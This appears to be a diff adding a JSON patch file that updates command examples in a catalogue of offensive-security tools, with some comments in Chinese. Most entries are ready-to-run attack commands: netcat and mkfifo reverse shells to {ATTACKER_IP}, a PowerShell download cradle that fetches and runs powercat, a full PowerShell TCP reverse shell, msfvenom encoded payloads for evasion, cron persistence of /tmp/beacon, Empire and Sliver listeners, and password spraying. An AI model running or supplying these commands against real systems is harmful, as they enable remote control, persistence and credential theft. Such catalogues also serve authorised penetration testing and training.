@@ -1,0 +1,143 @@
+{
+ "schemaVersion": 1,
+ "entries": [
+  {
+   "id": "exploit-frameworks",
+   "patches": [
+    {
+     "path": "commands.0.command",
+     "value": "git clone https://github.com/r00t-3xp10it/venom && cd venom\nsudo ./venom.sh\n# 交互式菜单中选择目标系统与载荷格式，按提示输入 LHOST/LPORT，产物在 output/ 目录"
+    },
+    {
+     "path": "commands.1.command",
+     "value": "spiderfoot -s {TARGET} -t ALL\n# v4+ 版本入口为 ./sf（交互 CLI），v3 为 spiderfoot"
+    },
+    {
+     "path": "commands.2.command",
+     "value": "python3 empire\n# 在 Empire 控制台:\nlisteners\nuselistener http\nset Name test\nexecute\nusestager windows/launcher_bat\nset Listener test\nexecute"
+    }
+   ]
+  },
+  {
+   "id": "hash-cracking",
+   "patches": [
+    {
+     "path": "commands.0.command",
+     "value": "hash-identifier\nhashid 'HASH'\n# 在线: https://hashes.com/en/tools/hash_identifier"
+    }
+   ]
+  },
+  {
+   "id": "john",
+   "patches": [
+    {
+     "path": "commands.8.command",
+     "value": "python3 -c \"import base64;t=open('fixtures/payloader-weak-hs256.jwt').read().strip();h,s=t.rsplit('.',1);sig=base64.urlsafe_b64decode(s+'='*(-len(s)%4)).hex();open('artifacts/jwt.hjohn','w').write(h+'#'+sig)\"\njohn --format=HMAC-SHA256 --wordlist=fixtures/approved-test-secrets.txt artifacts/jwt.hjohn"
+    }
+   ]
+  },
+  {
+   "id": "kerbrute-tool",
+   "patches": [
+    {
+     "path": "commands.3.command",
+     "value": "printf '%s\\n' \"{USERNAME}\" > user.txt\nkerbrute passwordspray -d {LAB_DOMAIN} --dc {LAB_DC_IP} user.txt \"{PASSWORD}\""
+    }
+   ]
+  },
+  {
+   "id": "metasploit-advanced",
+   "patches": [
+    {
+     "path": "commands.2.command",
+     "value": "sessions -l\nsessions -i 1\nsessions -u 1\nbackground"
+    },
+    {
+     "path": "commands.4.command",
+     "value": "run exploit/windows/local/ps_persist       # Windows PowerShell 计划任务持久化\nrun exploit/windows/local/vss_persistence  # Windows 影卷存储服务持久化\n# Linux 无专用 cron 持久化模块，进入 shell 手工维护:\nshell\n(crontab -l 2>/dev/null; echo \"*/30 * * * * /tmp/beacon\") | crontab -"
+    }
+   ]
+  },
+  {
+   "id": "password-spraying",
+   "patches": [
+    {
+     "path": "commands.0.command",
+     "value": "Import-Module MSOLSpray.ps1\nInvoke-MSOLSpray -UserList users.txt -Password \"Winter2024!\""
+    }
+   ]
+  },
+  {
+   "id": "rockyou",
+   "patches": [
+    {
+     "path": "commands.2.command",
+     "value": "gunzip /usr/share/wordlists/rockyou.txt.gz\nwc -l /usr/share/wordlists/rockyou.txt  # 约 1434 万行"
+    }
+   ]
+  },
+  {
+   "id": "sliver",
+   "patches": [
+    {
+     "path": "commands.2.command",
+     "value": "mtls --lhost 0.0.0.0 --lport 8888\nhttps --lhost 0.0.0.0 --lport 443 --domain {LAB_DOMAIN}\nwg --lhost 0.0.0.0 --lport 51820"
+    }
+   ]
+  },
+  {
+   "id": "ysoserial-net",
+   "patches": [
+    {
+     "path": "commands.2.command",
+     "value": "ysoserial.exe --fullhelp\n# 常用: TextFormattingRunProperties, TypeConfuseDelegate, PSObject"
+    }
+   ]
+  },
+  {
+   "id": "websocket-auth-lifecycle-audit",
+   "patches": [
+    {
+     "path": "commands.2.command",
+     "value": "python3 - <<'PY'\nimport asyncio\nimport json\nimport websockets\n\nasync def bounded_limits():\n    async with websockets.connect(\"ws://127.0.0.1:18080/ws/auth-lab\", subprotocols=[\"payloader-lab-v1\"]) as socket:\n        for sequence in range(5):\n            await socket.send(json.dumps({\"action\": \"ping\", \"sequence\": sequence}))\n        await socket.send(json.dumps({\"action\": \"echo\", \"marker\": \"A\" * 65536}))\n        print(await asyncio.wait_for(socket.recv(), timeout=2))\n\nasyncio.run(bounded_limits())\nPY"
+    }
+   ]
+  },
+  {
+   "id": "websocket-session-audit",
+   "patches": [
+    {
+     "path": "commands.1.command",
+     "value": "python3 - <<'PY'\nimport asyncio\nimport json\nimport websockets\n\nasync def capture_lab_messages():\n    async with websockets.connect(\"ws://127.0.0.1:18080/ws/lab\", origin=\"https://same-origin.invalid\", subprotocols=[\"payloader-lab-v1\"]) as socket:\n        await socket.send(json.dumps({\"action\": \"echo\", \"marker\": \"WS_CAPTURE_C3\"}))\n        for _ in range(3):\n            message = await asyncio.wait_for(socket.recv(), timeout=2)\n            print(message)\n            if \"WS_CAPTURE_C3\" in message:\n                break\n\nasyncio.run(capture_lab_messages())\nPY"
+    }
+   ]
+  },
+  {
+   "id": "evasion-techniques",
+   "patches": [
+    {
+     "path": "commands.0.command",
+     "value": "msfvenom -p windows/x64/shell_reverse_tcp LHOST={ATTACKER_IP} LPORT=4444 -e x64/xor_dynamic -i 5 -f exe -o encoded.exe\nmsfvenom -p windows/x64/meterpreter/reverse_https LHOST={ATTACKER_IP} LPORT=443 -f raw | openssl enc -aes-256-cbc -out enc_payload"
+    }
+   ]
+  },
+  {
+   "id": "nc-reverse",
+   "patches": [
+    {
+     "path": "commands.9.command",
+     "value": "nc -e /bin/sh {ATTACKER_IP} 1234\nrm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {ATTACKER_IP} 1234 >/tmp/f\nncat -e /bin/sh {ATTACKER_IP} 1234"
+    }
+   ]
+  },
+  {
+   "id": "powershell-reverse",
+   "patches": [
+    {
+     "path": "commands.4.command",
+     "value": "powershell -nop -c \"IEX(New-Object Net.WebClient).DownloadString('http://{ATTACKER_HOST}:8442/powercat.ps1');powercat -c {ATTACKER_HOST} -p 8443 -e cmd\"\npowershell -nop -c \"$client = New-Object System.Net.Sockets.TCPClient('{ATTACKER_IP}',1234);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()\""
+    }
+   ]
+  }
+ ]
+}
